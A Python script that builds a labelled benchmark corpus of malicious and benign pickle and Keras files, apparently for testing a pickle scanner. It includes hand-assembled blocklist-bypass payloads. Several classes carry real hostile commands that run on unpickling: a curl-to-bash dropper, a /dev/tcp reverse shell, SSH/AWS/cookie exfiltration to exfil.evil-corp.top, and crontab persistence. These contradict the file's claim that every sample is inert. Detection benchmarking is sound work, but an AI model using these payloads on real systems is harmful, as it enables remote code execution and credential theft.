"""Generate a labelled corpus of pickle samples for testing and benchmarking.

Every "malicious" sample is INERT. None runs a shell, opens a socket, or
touches anything real. The payloads exercise the *shape* of an attack - the
opcode patterns a real payload would use to reach a dangerous callable - so we
can measure detection without handling live malware.

The sample families map to documented blocklist-bypass techniques:
  direct        - names the sink outright (the easy case)
  alias         - names posix/nt instead of os (module-alias bypass)
  stack_global  - builds the global from stack strings (STACK_GLOBAL bypass)
  getattr       - reaches the sink through getattr (reflection bypass)
  nested        - a benign-looking pickle that unpickles a second payload
  setstate      - hides the call in __setstate__ via BUILD
  partial       - defers the call through functools.partial
"""
from __future__ import annotations

import base64
import json
import pickle
import pickletools
from pathlib import Path

SAMPLES = Path(__file__).resolve().parent.parent / "samples"

# A canary the "payload" would write. Never actually executed by the scanner.
CANARY = "PICKLELENS_CANARY"


class _Direct:
    def __reduce__(self):
        import os
        return (os.system, (f"echo {CANARY}",))


class _Eval:
    def __reduce__(self):
        return (eval, (f"__import__('os').system('echo {CANARY}')",))


class _Exec:
    def __reduce__(self):
        return (exec, (f"import os; os.system('echo {CANARY}')",))


class _Partial:
    def __reduce__(self):
        import functools
        import os
        return (functools.partial(os.system, f"echo {CANARY}"), ())


class _Subprocess:
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen, (["echo", CANARY],))


class _Nested:
    """Looks like it just decodes bytes; actually unpickles a second stage."""

    def __reduce__(self):
        inner = pickle.dumps(_Direct())
        return (pickle.loads, (inner,))


class _BuildReduce:
    """Sink reached via REDUCE, then a BUILD applies state on top of it.

    The dangerous callable is genuinely in the stream, so this is detectable;
    it exists to prove BUILD handling does not swallow a preceding REDUCE.
    """

    def __reduce__(self):
        import os
        return (os.system, (f"echo {CANARY}",), {"trained": True})


class _ClassSideSetState:
    """Out-of-scope by design: the malice is in this class's __setstate__,
    i.e. in code that is *already installed*, not in the pickle stream. A
    static stream analyzer cannot and should not flag this - the pickle only
    names a benign-looking class. We ship it labelled honestly so the
    benchmark states the limitation instead of hiding it.
    """

    def __setstate__(self, state):  # pragma: no cover - never run by scanner
        import os
        os.system(state)

    def __reduce__(self):
        return (_ClassSideSetState, (), f"echo {CANARY}")


class _Connect:
    def __reduce__(self):
        import socket
        return (socket.socket, ())


# --- realistic (still inert) malware-behavior payloads ------------------
# Each reproduces the calls + indicator strings of a malware class. The
# reachable command is harmless, but the URLs/paths/markers are what a real
# sample of that class would carry, so behavior classification has something
# concrete to key on.

class _Dropper:
    """Downloader: fetch a remote stage and run it via the shell."""
    def __reduce__(self):
        import os
        return (os.system,
                ("curl http://185.220.101.4/stage2.sh | bash",))


class _RevShell:
    """Reverse shell over bash /dev/tcp."""
    def __reduce__(self):
        import os
        return (os.system,
                ("bash -c 'bash -i >& /dev/tcp/10.0.0.6/4444 0>&1'",))


class _InfoStealer:
    """Reads SSH + AWS + browser secrets, exfiltrates over HTTP."""
    def __reduce__(self):
        import os
        cmd = ("tar czf /tmp/loot.tgz ~/.ssh/id_rsa ~/.aws/credentials "
               "'~/Library/Application Support/Google/Chrome/Default/Cookies' "
               "&& curl -F f=@/tmp/loot.tgz https://exfil.evil-corp.top/u")
        return (os.system, (cmd,))


class _Ransomware:
    """Destructive: encrypt+rename files and drop a ransom note with a BTC
    address. Inert - the command only echoes."""
    def __reduce__(self):
        import os
        note = ("echo 'Your files have been encrypted. Pay 0.5 BTC to "
                "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh to decrypt' "
                "> /tmp/READ_ME.locked.txt")
        return (os.system, (note,))


class _Persistence:
    """Adds a cron job for persistence."""
    def __reduce__(self):
        import os
        return (os.system,
                ("(crontab -l; echo '@reboot /tmp/.x') | crontab -",))


def _alias_payload() -> bytes:
    """GLOBAL naming posix.system directly - bypasses an 'os.system' blocklist.

    Protocol 0 GLOBAL takes 'module\\nname\\n'. Hand-assembled so the alias is
    exactly what an attacker would write to dodge a literal 'os.system' match.
    """
    return (
        b"cposix\nsystem\n"                      # GLOBAL posix system
        b"(S'echo " + CANARY.encode() + b"'\n"   # MARK, push arg string
        b"tR."                                   # TUPLE, REDUCE, STOP
    )


def _getattr_payload() -> bytes:
    """getattr(__import__('os'), 'system')('echo ...').

    The dangerous target `os.system` never appears as a GLOBAL argument; it is
    assembled through reflection, the canonical way around a name blocklist.
    """
    return (
        b"\x80\x04"                               # PROTO 4
        b"\x8c\x08builtins"                       # "builtins"
        b"\x8c\x07getattr"                        # "getattr"
        b"\x93"                                   # STACK_GLOBAL -> getattr
        b"\x8c\x08builtins"                       # "builtins"
        b"\x8c\x0a__import__"                     # "__import__"
        b"\x93"                                   # STACK_GLOBAL -> __import__
        b"\x8c\x02os"                             # "os"
        b"\x85R"                                  # TUPLE1, REDUCE -> __import__('os')
        b"\x8c\x06system"                         # "system"
        b"\x86"                                   # TUPLE2 -> (os_module, 'system')
        b"R"                                      # REDUCE -> getattr(...)
        b"\x8c\x0e" + f"echo {CANARY}".encode()   # "echo CANARY"
        + b"\x85R"                                # TUPLE1, REDUCE -> os.system('echo...')
        b"."                                      # STOP
    )


class _Asm:
    """A tiny pickle opcode assembler, so hand-crafted bypass samples are
    readable and verifiably correct rather than opaque byte blobs.
    """

    def __init__(self) -> None:
        self.buf = bytearray(b"\x80\x04")  # PROTO 4

    def unicode(self, s: str) -> "_Asm":
        b = s.encode()
        assert len(b) < 256
        self.buf += b"\x8c" + bytes([len(b)]) + b     # SHORT_BINUNICODE
        return self

    def stack_global(self, module: str, name: str) -> "_Asm":
        return self.unicode(module).unicode(name)._op(b"\x93")  # STACK_GLOBAL

    def mark(self) -> "_Asm":
        return self._op(b"(")

    def tuple(self) -> "_Asm":
        return self._op(b"t")                          # TUPLE (to MARK)

    def tuple1(self) -> "_Asm":
        return self._op(b"\x85")

    def reduce(self) -> "_Asm":
        return self._op(b"R")

    def stop(self) -> bytes:
        return bytes(self.buf + b".")

    def _op(self, op: bytes) -> "_Asm":
        self.buf += op
        return self


def _unlisted_reflection_payload() -> bytes:
    """os.system reached ONLY through globals picklescan does not list.

    picklescan flags builtins.getattr, but NOT importlib.import_module,
    builtins.vars, or operator.getitem. This chain -
        operator.getitem(vars(importlib.import_module('os')), 'system')('...')
    - names none of os/nt/posix/subprocess and no flagged builtin, so a
    name-blocklist scanner sees three innocuous globals. A reachability model
    that follows REDUCE sees the composition assemble os.system and call it.
    """
    a = _Asm()
    a.stack_global("operator", "getitem")     # [getitem]
    a.mark()                                   # [getitem, M]
    a.stack_global("builtins", "vars")         # [getitem, M, vars]
    a.mark()                                    # [getitem, M, vars, M]
    a.stack_global("importlib", "import_module")
    a.mark()
    a.unicode("os")
    a.tuple().reduce()                          # import_module('os') -> os
    a.tuple().reduce()                          # vars(os) -> namespace
    a.unicode("system")
    a.tuple().reduce()                          # getitem(namespace,'system')
    a.unicode(f"echo {CANARY}")
    a.tuple1().reduce()                         # os.system('echo CANARY')
    return a.stop()


def _marshal_payload() -> bytes:
    """marshal.loads is unlisted by picklescan; it is the canonical loader
    for a raw code object (first stage of a marshal+exec loader)."""
    a = _Asm()
    a.stack_global("marshal", "loads")
    a.unicode("<code-object-bytes>")            # placeholder payload
    a.tuple1().reduce()
    return a.stop()


def _stack_global_payload() -> bytes:
    """Build os.system via STACK_GLOBAL from two stack strings.

    This never appears as a GLOBAL opcode argument, so a scanner that only
    reads literal GLOBAL args sees nothing.
    """
    import pickle as _p
    # Hand-assemble: push "os", push "system", STACK_GLOBAL, push arg, REDUCE, STOP
    body = (
        b"\x80\x04"                              # PROTO 4
        b"\x8c\x02os"                            # SHORT_BINUNICODE "os"
        b"\x8c\x06system"                        # SHORT_BINUNICODE "system"
        b"\x93"                                  # STACK_GLOBAL
        b"\x8c\x0e" + f"echo {CANARY}".encode()  # SHORT_BINUNICODE arg
        + b"\x85"                                # TUPLE1
        b"R"                                     # REDUCE
        b"."                                     # STOP
    )
    return body


def _keras_lambda_archive() -> bytes:
    """A .keras (ZIP) whose config.json declares a Lambda layer carrying an
    embedded serialized function - Keras executes it via func_load on load.
    The 'function' payload here is inert placeholder text."""
    import io
    import json
    import zipfile
    config = {
        "class_name": "Sequential",
        "config": {"layers": [
            {"class_name": "Dense", "config": {"units": 8}},
            {"class_name": "Lambda", "config": {
                "name": "lambda_backdoor",
                "function": ["<base64-marshalled-code-object>", None, None],
                "function_type": "lambda",
            }},
        ]},
    }
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("config.json", json.dumps(config))
        zf.writestr("metadata.json", '{"keras_version": "3.0.0"}')
    return buf.getvalue()


def _keras_benign_archive() -> bytes:
    import io
    import json
    import zipfile
    config = {"class_name": "Sequential", "config": {"layers": [
        {"class_name": "Dense", "config": {"units": 8}},
        {"class_name": "Softmax", "config": {}},
    ]}}
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("config.json", json.dumps(config))
    return buf.getvalue()


BENIGN_STATE = {"weights": [0.1, 0.2, 0.3], "layers": 4, "name": "tiny-net"}


def _benign_dict() -> bytes:
    return pickle.dumps(BENIGN_STATE)


def _benign_nested_list() -> bytes:
    return pickle.dumps([{"a": list(range(100))}, ("t", 1, 2.0), {1, 2, 3}])


# name, data, malicious, family, in_scope
# in_scope=False marks a payload whose malice is not present in the pickle
# stream (it lives in already-installed code), so no stream analyzer can catch
# it. Excluded from detection scoring; reported separately as a stated limit.
MANIFEST: list[tuple[str, bytes, bool, str, bool]] = []


def _add(name: str, data: bytes, malicious: bool, family: str,
         in_scope: bool = True) -> None:
    MANIFEST.append((name, data, malicious, family, in_scope))


def build() -> list[dict]:
    SAMPLES.mkdir(exist_ok=True)
    MANIFEST.clear()  # idempotent: repeated calls in one process must not stack

    _add("mal_direct.pkl", pickle.dumps(_Direct()), True, "direct")
    _add("mal_eval.pkl", pickle.dumps(_Eval()), True, "direct")
    _add("mal_exec.pkl", pickle.dumps(_Exec()), True, "direct")
    _add("mal_getattr.pkl", _getattr_payload(), True, "getattr")
    _add("mal_partial.pkl", pickle.dumps(_Partial()), True, "partial")
    _add("mal_subprocess.pkl", pickle.dumps(_Subprocess()), True, "direct")
    _add("mal_nested.pkl", pickle.dumps(_Nested()), True, "nested")
    _add("mal_build.pkl", pickle.dumps(_BuildReduce()), True, "build")
    _add("mal_socket.pkl", pickle.dumps(_Connect()), True, "network")
    _add("oos_classsetstate.pkl", pickle.dumps(_ClassSideSetState()),
         True, "class_side", in_scope=False)
    _add("mal_stackglobal.pkl", _stack_global_payload(), True, "stack_global")
    _add("mal_alias.pkl", _alias_payload(), True, "alias")
    _add("mal_unlisted_reflection.pkl", _unlisted_reflection_payload(),
         True, "unlisted_reflection")
    _add("mal_marshal.pkl", _marshal_payload(), True, "unlisted_marshal")

    # Keras Lambda-layer RCE vector (independent of pickle).
    _add("mal_keras_lambda.keras", _keras_lambda_archive(), True, "keras_lambda")
    _add("benign_keras.keras", _keras_benign_archive(), False, "benign")

    # Malware-behavior corpus (inert; carry realistic indicator strings).
    _add("mal_dropper.pkl", pickle.dumps(_Dropper()), True, "dropper")
    _add("mal_revshell.pkl", pickle.dumps(_RevShell()), True, "c2")
    _add("mal_infostealer.pkl", pickle.dumps(_InfoStealer()), True, "infostealer")
    _add("mal_ransomware.pkl", pickle.dumps(_Ransomware()), True, "ransomware")
    _add("mal_persistence.pkl", pickle.dumps(_Persistence()), True, "persistence")

    _add("benign_dict.pkl", _benign_dict(), False, "benign")
    _add("benign_nested.pkl", _benign_nested_list(), False, "benign")
    _add("benign_string.pkl", pickle.dumps("just a model name"), False, "benign")
    _add("benign_numbers.pkl", pickle.dumps(list(range(1000))), False, "benign")

    manifest = []
    for name, data, malicious, family, in_scope in MANIFEST:
        (SAMPLES / name).write_bytes(data)
        manifest.append({
            "name": name,
            "malicious": malicious,
            "family": family,
            "in_scope": in_scope,
            "bytes": len(data),
        })

    (SAMPLES / "manifest.json").write_text(json.dumps(manifest, indent=2))
    return manifest


if __name__ == "__main__":
    for entry in build():
        flag = "MAL " if entry["malicious"] else "safe"
        scope = "" if entry["in_scope"] else "  [out-of-scope]"
        print(f"{flag} {entry['name']:24} {entry['family']:14} "
              f"{entry['bytes']:>6}B{scope}")
